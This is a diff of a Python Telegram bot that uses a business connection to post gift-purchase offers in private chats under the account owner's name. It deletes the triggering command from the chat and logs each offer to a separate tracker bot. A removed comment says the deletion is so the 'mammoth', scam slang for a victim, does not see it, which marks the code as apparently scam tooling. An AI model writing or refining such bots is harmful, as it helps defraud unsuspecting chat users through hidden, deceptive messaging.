@@ -88,7 +88,7 @@ def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     )
 
 # =====================================
-# ТРЕКЕР (логирование)
+# ТРЕКЕР (Логирование)
 # =====================================
 tracker_bot = None
 if TRACKER_BOT_TOKEN:
@@ -122,17 +122,21 @@ async def fetch_gift_name(url: str) -> str:
     return url.rsplit("/", 1)[-1] or url
 
 # =====================================
-# КОМАНДА .оффер
+# КОМАНДА .оффер (ПОЛУЧЕНИЕ ТЕКСТА)
 # =====================================
-@dp.business_message(F.text.startswith(".оффер"))
+@dp.business_message(F.text)
 async def handle_custom_command(message: Message):
-    logging.info("!!! ПОЛУЧЕНА КОМАНДА .оффер !!!")
+    # Проверяем, начинается ли текст с .оффер
+    if not message.text or not message.text.startswith(".оффер"):
+        return
+
+    logging.info("!!! БОТ УВИДЕЛ КОМАНДУ .оффер !!!")
     try:
         text = message.text.replace(".оффер", "", 1).strip()
         parts = text.split()
 
         if len(parts) < 3:
-            logging.warning("Неверный формат")
+            logging.warning("Неверный формат: нужно ссылка, сумма, валюта")
             return
 
         url = parts[0]
@@ -146,10 +150,6 @@ async def handle_custom_command(message: Message):
             url = "https://" + url
 
         if cur_key not in CURRENCY:
-            await bot.send_message(
-                message.chat.id, "Валюта: g (💎) или s (⭐)",
-                business_connection_id=message.business_connection_id
-            )
             return
 
         t = TEXTS.get(lang, TEXTS["ru"])
@@ -162,32 +162,38 @@ async def handle_custom_command(message: Message):
             "cur": CURRENCY[cur_key],
             "lang": lang,
             "gift_name": gift_name,
-            "seller_id": message.from_user.id,
             "seller_name": f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name,
         }
 
-        # Удаляем команду из чата (чтобы мамонт не видел)
+        # Удаляем команду из чата
         try:
             await bot.delete_business_messages(
                 business_connection_id=message.business_connection_id,
                 message_ids=[message.message_id]
             )
+            logging.info("Команда .оффер удалена из чата")
         except Exception as e:
-            logging.error(f"Delete error: {e}")
+            logging.error(f"Ошибка удаления команды: {e}")
 
-        # Отправляем оффер в ТОТ ЖЕ ЧАТ от твоего имени
-        await bot.send_message(
-            chat_id=message.chat.id,
-            text=t["offer_text"].format(
-                who=OFFERS[oid]["seller_name"],
-                sum=raw_sum,
-                cur=CURRENCY[cur_key],
-                name=gift_name
-            ),
-            reply_markup=offer_kb(oid, lang),
-            business_connection_id=message.business_connection_id,
-            link_preview_options=NO_PREVIEW
-        )
+        # Отправляем оффер в тот же чат
+        try:
+            await bot.send_message(
+                chat_id=message.chat.id,
+                text=t["offer_text"].format(
+                    who=OFFERS[oid]["seller_name"],
+                    sum=raw_sum,
+                    cur=CURRENCY[cur_key],
+                    name=gift_name
+                ),
+                reply_markup=offer_kb(oid, lang),
+                business_connection_id=message.business_connection_id,
+                link_preview_options=LinkPreviewOptions(
+                    is_disabled=False, prefer_large_media=True, show_above_text=True
+                )
+            )
+            logging.info("Оффер успешно отправлен в чат!")
+        except Exception as e:
+            logging.error(f"КРИТИЧЕСКАЯ ОШИБКА ОТПРАВКИ ОФФЕРА: {e}")
 
         await tracker_log(
             f"🆕 Оффер {oid}: {OFFERS[oid]['seller_name']} → чат | "
@@ -197,10 +203,10 @@ async def handle_custom_command(message: Message):
     except TelegramRetryAfter as e:
         await asyncio.sleep(e.retry_after)
     except Exception:
-        logging.exception("Ошибка в .оффер")
+        logging.exception("Ошибка в обработчике .оффер")
 
 # =====================================
-# КОЛБЭКИ
+# ОСТАЛЬНЫЕ ОБРАБОТЧИКИ (КНОПКИ)
 # =====================================
 @dp.callback_query(F.data.startswith("acc:"))
 async def cb_accept(call: CallbackQuery):
@@ -287,7 +293,8 @@ async def main():
     http_session = aiohttp.ClientSession()
     print("Оффер-бот запущен!")
     try:
-        await dp.start_polling(bot)
+        # ВАЖНО: allowed_updates гарантирует, что бот будет слушать бизнес-сообщения
+        await dp.start_polling(bot, allowed_updates=["business_message", "message", "callback_query"])
     finally:
         await http_session.close()
 
